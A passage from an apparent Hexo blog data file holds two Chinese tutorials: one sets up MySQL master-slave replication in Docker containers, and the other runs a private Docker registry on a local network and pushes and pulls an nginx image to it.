class=\"line\">binlog_format=mixed  </span><br><span class=\"line\"><span class=\"comment\">## 二进制日志过期清理时间。默认值为0，表示不自动清理。</span></span><br><span class=\"line\">expire_logs_days=7  </span><br><span class=\"line\"><span class=\"comment\">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。</span></span><br><span class=\"line\"><span class=\"comment\">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致</span></span><br><span class=\"line\">slave_skip_errors=1062</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>进入容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-master /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>授权用户</li>\n</ol>\n<p>进入数据库，添加授权用户。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span> IDENTIFIED <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">GRANT</span> REPLICATION SLAVE, REPLICATION CLIENT <span class=\"keyword\">ON</span> <span class=\"operator\">*</span>.<span class=\"operator\">*</span> <span class=\"keyword\">TO</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>实现效果：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type <span class=\"string\">&#x27;help;&#x27;</span> <span class=\"keyword\">or</span> <span class=\"string\">&#x27;\\h&#x27;</span> <span class=\"keyword\">for</span> help. Type <span class=\"string\">&#x27;\\c&#x27;</span> <span class=\"keyword\">to</span> clear the <span class=\"keyword\">current</span> input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span> IDENTIFIED <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.03</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">GRANT</span> REPLICATION SLAVE, REPLICATION CLIENT <span class=\"keyword\">ON</span> <span class=\"operator\">*</span>.<span class=\"operator\">*</span> <span class=\"keyword\">TO</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span>;</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.02</span> sec)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>查看主数据库的主状态</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> master status;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> File                 <span class=\"operator\">|</span> Position <span class=\"operator\">|</span> Binlog_Do_DB <span class=\"operator\">|</span> Binlog_Ignore_DB <span class=\"operator\">|</span> Executed_Gtid_Set <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span> <span class=\"operator\">|</span>      <span class=\"number\">156</span> <span class=\"operator\">|</span>              <span class=\"operator\">|</span> mysql            <span class=\"operator\">|</span>                   <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"number\">1</span> <span class=\"type\">row</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>创建从数据库容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3308:3306 \\</span><br><span class=\"line\">--privileged=<span class=\"literal\">true</span> \\</span><br><span class=\"line\">-v /docker/mysql-slave/log:/var/log/mysql \\</span><br><span class=\"line\">-v /docker/mysql-slave/data:/var/lib/mysql \\</span><br><span class=\"line\">-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=admin \\</span><br><span class=\"line\">--name mysql-slave \\</span><br><span class=\"line\">mysql:latest</span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li>实现效果：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES</span><br><span class=\"line\">06a84db29686   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308-&gt;3306/tcp, :::3308-&gt;3306/tcp   mysql-slave</span><br><span class=\"line\">a1f6f6e03029   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp   mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li>添加配置文件</li>\n</ol>\n<p>进入<code>/docker/mysql-slave/conf</code>目录，编辑配置文件<code>my.cnf</code>，插入以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">## 设置server_id，同一局域网中需要唯一</span></span><br><span class=\"line\">server_id=102</span><br><span class=\"line\"><span class=\"comment\">## 指定不需要同步的数据库名称</span></span><br><span class=\"line\">binlog-ignore-db=mysql  </span><br><span class=\"line\"><span class=\"comment\">## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用</span></span><br><span class=\"line\">log-bin=com-mysql-slave1-bin  </span><br><span class=\"line\"><span class=\"comment\">## 设置二进制日志使用内存大小（事务）</span></span><br><span class=\"line\">binlog_cache_size=1M  </span><br><span class=\"line\"><span class=\"comment\">## 设置使用的二进制日志格式（mixed,statement,row）</span></span><br><span class=\"line\">binlog_format=mixed  </span><br><span class=\"line\"><span class=\"comment\">## 二进制日志过期清理时间。默认值为0，表示不自动清理。</span></span><br><span class=\"line\">expire_logs_days=7  </span><br><span class=\"line\"><span class=\"comment\">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。</span></span><br><span class=\"line\"><span class=\"comment\">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致</span></span><br><span class=\"line\">slave_skip_errors=1062  </span><br><span class=\"line\"><span class=\"comment\">## relay_log配置中继日志</span></span><br><span class=\"line\">relay_log=com-mysql-relay-bin  </span><br><span class=\"line\"><span class=\"comment\">## log_slave_updates表示slave将复制事件写进自己的二进制日志</span></span><br><span class=\"line\">log_slave_updates=1  </span><br><span class=\"line\"><span class=\"comment\">## slave设置为只读（具有super权限的用户除外）</span></span><br><span class=\"line\">read_only=1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-slave</span><br></pre></td></tr></table></figure>\n\n<ol start=\"12\">\n<li>在从数据库中配置主从复制</li>\n</ol>\n<p>进入容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-slave /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>进入数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -padmin</span><br></pre></td></tr></table></figure>\n\n<p>开启复制功能</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">change master <span class=\"keyword\">to</span> master_host<span class=\"operator\">=</span><span class=\"string\">&#x27;192.168.1.42&#x27;</span>, master_user<span class=\"operator\">=</span><span class=\"string\">&#x27;slave&#x27;</span>, master_password<span class=\"operator\">=</span><span class=\"string\">&#x27;123456&#x27;</span>, master_port<span class=\"operator\">=</span><span class=\"number\">3307</span>, master_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;com-mysql-bin.000001&#x27;</span>, master_log_pos<span class=\"operator\">=</span><span class=\"number\">156</span>, master_connect_retry<span class=\"operator\">=</span><span class=\"number\">30</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上面的宿主机ip需要根据实际情况修改。</p>\n<p>主从复制参数说明：</p>\n<ul>\n<li>master_host：主数据库的IP地址；</li>\n<li>master_port：主数据库的运行端口；</li>\n<li>master_user：在主数据库创建的用于同步数据的用户账号；</li>\n<li>master_password：在主数据库创建的用于同步数据的用户密码；</li>\n<li>master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；</li>\n<li>master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；</li>\n<li>master_connect_retry：连接失败重试的时间间隔，单位为秒。</li>\n</ul>\n<ol start=\"13\">\n<li>在从数据库中开启主从同步</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">start</span> slave;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"14\">\n<li>查看从数据库状态</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> slave status \\G;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> slave status \\G</span><br><span class=\"line\"><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span> <span class=\"number\">1.</span> <span class=\"type\">row</span> <span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span></span><br><span class=\"line\">               Slave_IO_State: Connecting <span class=\"keyword\">to</span> source</span><br><span class=\"line\">                  Master_Host: <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.42</span></span><br><span class=\"line\">                  Master_User: slave</span><br><span class=\"line\">                  Master_Port: <span class=\"number\">3307</span></span><br><span class=\"line\">                Connect_Retry: <span class=\"number\">30</span></span><br><span class=\"line\">              Master_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">          Read_Master_Log_Pos: <span class=\"number\">156</span></span><br><span class=\"line\">               Relay_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>relay<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">                Relay_Log_Pos: <span class=\"number\">4</span></span><br><span class=\"line\">        Relay_Master_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br></pre></td></tr></table></figure>\n\n<ol start=\"15\">\n<li>主从复制测试</li>\n</ol>\n<p>主库新建库、新建表、插入数据：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> database db108;</span><br><span class=\"line\">use db108;</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> t1 (id <span class=\"type\">int</span>,name <span class=\"type\">varchar</span>(<span class=\"number\">20</span>));</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> t1 <span class=\"keyword\">values</span>(<span class=\"number\">1</span>,<span class=\"string\">&#x27;liuxp&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> t1;</span><br></pre></td></tr></table></figure>\n\n<p>从库查看库、查看记录，看主从同步是否成功:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> databases;</span><br><span class=\"line\">use db108;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> t1;</span><br></pre></td></tr></table></figure>"},{"title":"Docker镜像推送到私有仓库","date":"2023-08-09T15:15:50.000Z","_content":"\n在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。\n\n1. 拉取镜像\n\n执行以下命令：\n\n```bash\ndocker pull registry\n```\n\n<!-- more -->\n\n2. 运行容器\n\n下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：\n\n```bash\ndocker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=true --name registry-1 registry\n```\n\n* -d 守护进程运行（后台运行）\n\n* -v 数据卷映射，把本地的`/docker/registry/`映射为容器的`/tmp/registry`。\n\n* --privileged=true，container内的root拥有真正的root权限。具体解释参考[这篇文章](https://blog.csdn.net/wangxuelei036/article/details/107457712)。\n\n* --name 指定容器的名字，不设置会由系统随机分配一个。\n\n3. 测试仓库可用性\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ncurl -XGET http://192.168.1.42:5000/v2/_catalog\n```\n\n下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现`{\"repositories\":[]}`,表示本地私有仓库可用。\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[]}\n```\n\n4. 生成镜像\n\n更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerCommit/)\n\n比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：\n\n```bash\nroot@knight:/# docker commit -m \"add net-tools package\" -a \"lxp\" nginx-1 mynginx:1.1\nsha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2\nroot@knight:/# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED          SIZE\nmynginx          1.1       f35ce030ad11   11 seconds ago   198MB\nmynginx          1.0       ff65638c821e   5 hours ago      196MB\n```\n\n5. 更改镜像名称\n\n上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ndocker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1\n```\n\n效果如下：\n\n```bash\nroot@knight:/# docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 \nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED          SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.0       ff65638c821e   5 hours ago      196MB\n```\n\n可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。\n\n6. 修改配置文件\n\n在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。\n\n例：\n\n```bash\nroot@knight:/# cat /etc/docker/daemon.json \n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"],\n  \"insecure-registries\": [\"192.168.1.42:5000\"]\n}\n```\n\n* registry-mirrors 是加速用的。\n\n* insecure-registries 是开启http协议的。\n\n配置完成后如果不生效，尝试`systemctl daemon-reload`。\n\n如果还是不行，尝试`systemctl restart docker`，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。\n\n如果重启了docker，不要忘记步骤2，重新运行容器。\n\n7. 上传到私有仓库\n\n```bash\ndocker push 192.168.1.42:5000/mynginx:1.1 \n```\n\n例子：\n\n```bash\nroot@knight:/# docker push 192.168.1.42:5000/mynginx:1.1 \nThe push refers to repository [192.168.1.42:5000/mynginx]\n0033c6e89448: Pushed \nd874fd2bc83b: Pushed \n32ce5f6a5106: Pushed \nf1db227348d0: Pushed \nb8d6e692a25e: Pushed \ne379e8aedd4d: Pushed \n2edcec3590a4: Pushed \n1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782\n```\n\n8. 验证仓库镜像\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[\"mynginx\"]}\n```\n\n可以看到现在仓库中已经存在“mynginx”的镜像了。\n\n9. PULL到本地使用\n\n```\ndocker pull 192.168.1.42:5000/mynginx:1.1\n```\n\n例子：\n\n```bash 折叠代码\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker rmi 192.168.1.42:5000/mynginx:1.1 \nUntagged: 192.168.1.42:5000/mynginx:1.1\nUntagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nroot@knight:/# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED             SIZE\nmynginx      1.1       f35ce030ad11   About an hour ago   198MB\nnginx        latest    605c77e624dd   19 months ago       141MB\nregistry     latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker pull 192.168.1.42:5000/mynginx:1.1\n1.1: Pulling from mynginx\nDigest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nStatus: Downloaded newer image for 192.168.1.42:5000/mynginx:1.1\n192.168.1.42:5000/mynginx:1.1\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\n```","source":"_posts/DockerPushLocal.md","raw":"---\ntitle: Docker镜像推送到私有仓库\ndate: 2023-08-09 23:15:50\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。\n\n1. 拉取镜像\n\n执行以下命令：\n\n```bash\ndocker pull registry\n```\n\n<!-- more -->\n\n2. 运行容器\n\n下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：\n\n```bash\ndocker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=true --name registry-1 registry\n```\n\n* -d 守护进程运行（后台运行）\n\n* -v 数据卷映射，把本地的`/docker/registry/`映射为容器的`/tmp/registry`。\n\n* --privileged=true，container内的root拥有真正的root权限。具体解释参考[这篇文章](https://blog.csdn.net/wangxuelei036/article/details/107457712)。\n\n* --name 指定容器的名字，不设置会由系统随机分配一个。\n\n3. 测试仓库可用性\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ncurl -XGET http://192.168.1.42:5000/v2/_catalog\n```\n\n下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现`{\"repositories\":[]}`,表示本地私有仓库可用。\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[]}\n```\n\n4. 生成镜像\n\n更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerCommit/)\n\n比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：\n\n```bash\nroot@knight:/# docker commit -m \"add net-tools package\" -a \"lxp\" nginx-1 mynginx:1.1\nsha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2\nroot@knight:/# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED          SIZE\nmynginx          1.1       f35ce030ad11   11 seconds ago   198MB\nmynginx          1.0       ff65638c821e   5 hours ago      196MB\n```\n\n5. 更改镜像名称\n\n上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ndocker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1\n```\n\n效果如下：\n\n```bash\nroot@knight:/# docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 \nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED          SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.0       ff65638c821e   5 hours ago      196MB\n```\n\n可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。\n\n6. 修改配置文件\n\n在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。\n\n例：\n\n```bash\nroot@knight:/# cat /etc/docker/daemon.json \n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"],\n  \"insecure-registries\": [\"192.168.1.42:5000\"]\n}\n```\n\n* registry-mirrors 是加速用的。\n\n* insecure-registries 是开启http协议的。\n\n配置完成后如果不生效，尝试`systemctl daemon-reload`。\n\n如果还是不行，尝试`systemctl restart docker`，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。\n\n如果重启了docker，不要忘记步骤2，重新运行容器。\n\n7. 上传到私有仓库\n\n```bash\ndocker push 192.168.1.42:5000/mynginx:1.1 \n```\n\n例子：\n\n```bash\nroot@knight:/# docker push 192.168.1.42:5000/mynginx:1.1 \nThe push refers to repository [192.168.1.42:5000/mynginx]\n0033c6e89448: Pushed \nd874fd2bc83b: Pushed \n32ce5f6a5106: Pushed \nf1db227348d0: Pushed \nb8d6e692a25e: Pushed \ne379e8aedd4d: Pushed \n2edcec3590a4: Pushed \n1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782\n```\n\n8. 验证仓库镜像\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[\"mynginx\"]}\n```\n\n可以看到现在仓库中已经存在“mynginx”的镜像了。\n\n9. PULL到本地使用\n\n```\ndocker pull 192.168.1.42:5000/mynginx:1.1\n```\n\n例子：\n\n```bash 折叠代码\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker rmi 192.168.1.42:5000/mynginx:1.1 \nUntagged: 192.168.1.42:5000/mynginx:1.1\nUntagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nroot@knight:/# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED             SIZE\nmynginx      1.1       f35ce030ad11   About an hour ago   198MB\nnginx        latest    605c77e624dd   19 months ago       141MB\nregistry     latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker pull 192.168.1.42:5000/mynginx:1.1\n1.1: Pulling from mynginx\nDigest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nStatus: Downloaded newer image for 192.168.1.42:5000/mynginx:1.1\n192.168.1.42:5000/mynginx:1.1\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\n```","slug":"DockerPushLocal","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dt001v7zj3ajhrf0d9","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script 